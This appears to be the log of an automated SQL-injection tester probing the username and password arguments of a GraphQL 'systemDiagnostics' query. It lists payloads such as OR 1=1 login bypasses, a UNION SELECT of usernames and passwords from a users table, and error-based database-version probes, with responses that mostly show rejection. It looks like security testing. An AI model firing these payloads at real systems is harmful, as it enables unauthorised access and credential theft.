2026-02-02 23:16:04,770 | INFO    | InjectionTester      | or_1_eq_1_dash                 | systemDiagnostics.username | POST | success  |  0.013s | payload=[' OR 1=1 --] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-02 23:16:04,780 | INFO    | InjectionTester      | or_string_eq                   | systemDiagnostics.username | POST | success  |  0.010s | payload=[' OR '1'='1] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-02 23:16:04,783 | INFO    | InjectionTester      | double_quote_or                | systemDiagnostics.username | POST | success  |  0.002s | payload=[" OR ""="] response=[{"errors": [{"message": "Syntax Error GraphQL (1:43) Expected :, found String\n\n1: query { systemDiagnostics(username: \"\" OR \"\"=\"\", password: \"changeme\", cmd: \"test\") }\n                   …]
2026-02-02 23:16:04,785 | INFO    | InjectionTester      | double_quote_1_eq_1            | systemDiagnostics.username | POST | success  |  0.002s | payload=[" OR 1=1 --] response=[{"errors": [{"message": "Syntax Error GraphQL (1:43) Expected :, found Int \"1\"\n\n1: query { systemDiagnostics(username: \"\" OR 1=1 --\", password: \"changeme\", cmd: \"test\") }\n                 …]
2026-02-02 23:16:04,795 | INFO    | InjectionTester      | or_1_eq_1_hash                 | systemDiagnostics.username | POST | success  |  0.010s | payload=[' OR 1=1 #] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-02 23:16:04,806 | INFO    | InjectionTester      | admin_comment_dash             | systemDiagnostics.username | POST | success  |  0.011s | payload=[admin' --] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-02 23:16:04,817 | INFO    | InjectionTester      | admin_comment_hash             | systemDiagnostics.username | POST | success  |  0.011s | payload=[admin' #] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-02 23:16:04,827 | INFO    | InjectionTester      | admin_comment_star             | systemDiagnostics.username | POST | success  |  0.009s | payload=[admin'/*] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-02 23:16:04,839 | INFO    | InjectionTester      | union_select_123               | systemDiagnostics.username | POST | success  |  0.011s | payload=[' UNION SELECT 1,2,3 --] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-02 23:16:04,849 | INFO    | InjectionTester      | union_select_users             | systemDiagnostics.username | POST | success  |  0.010s | payload=[' OR 1=1 UNION SELECT 1,username,password FROM users --] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-02 23:16:04,859 | INFO    | InjectionTester      | error_based_version            | systemDiagnostics.username | POST | success  |  0.009s | payload=[' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-02 23:16:04,869 | INFO    | InjectionTester      | error_based_extractvalue       | systemDiagnostics.username | POST | success  |  0.010s | payload=[' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e)) --] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-02 23:16:04,879 | INFO    | InjectionTester      | boolean_true                   | systemDiagnostics.username | POST | success  |  0.010s | payload=[' AND 1=1 --] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-02 23:16:04,889 | INFO    | InjectionTester      | boolean_false                  | systemDiagnostics.username | POST | success  |  0.009s | payload=[' AND 1=0 --] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-02 23:16:04,900 | INFO    | InjectionTester      | single_quote                   | systemDiagnostics.password | POST | success  |  0.010s | payload=['] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:04,912 | INFO    | InjectionTester      | or_1_eq_1_dash                 | systemDiagnostics.password | POST | success  |  0.012s | payload=[' OR 1=1 --] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:04,923 | INFO    | InjectionTester      | or_string_eq                   | systemDiagnostics.password | POST | success  |  0.010s | payload=[' OR '1'='1] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:04,925 | INFO    | InjectionTester      | double_quote_or                | systemDiagnostics.password | POST | success  |  0.002s | payload=[" OR ""="] response=[{"errors": [{"message": "Syntax Error GraphQL (1:62) Expected :, found String\n\n1: query { systemDiagnostics(username: \"admin\", password: \"\" OR \"\"=\"\", cmd: \"test\") }\n                      …]
2026-02-02 23:16:04,927 | INFO    | InjectionTester      | double_quote_1_eq_1            | systemDiagnostics.password | POST | success  |  0.002s | payload=[" OR 1=1 --] response=[{"errors": [{"message": "Syntax Error GraphQL (1:62) Expected :, found Int \"1\"\n\n1: query { systemDiagnostics(username: \"admin\", password: \"\" OR 1=1 --\", cmd: \"test\") }\n                    …]
2026-02-02 23:16:04,937 | INFO    | InjectionTester      | or_1_eq_1_hash                 | systemDiagnostics.password | POST | success  |  0.009s | payload=[' OR 1=1 #] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:04,947 | INFO    | InjectionTester      | admin_comment_dash             | systemDiagnostics.password | POST | success  |  0.010s | payload=[admin' --] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:04,958 | INFO    | InjectionTester      | admin_comment_hash             | systemDiagnostics.password | POST | success  |  0.010s | payload=[admin' #] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:04,968 | INFO    | InjectionTester      | admin_comment_star             | systemDiagnostics.password | POST | success  |  0.009s | payload=[admin'/*] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:04,977 | INFO    | InjectionTester      | union_select_123               | systemDiagnostics.password | POST | success  |  0.009s | payload=[' UNION SELECT 1,2,3 --] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:04,987 | INFO    | InjectionTester      | union_select_users             | systemDiagnostics.password | POST | success  |  0.009s | payload=[' OR 1=1 UNION SELECT 1,username,password FROM users --] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
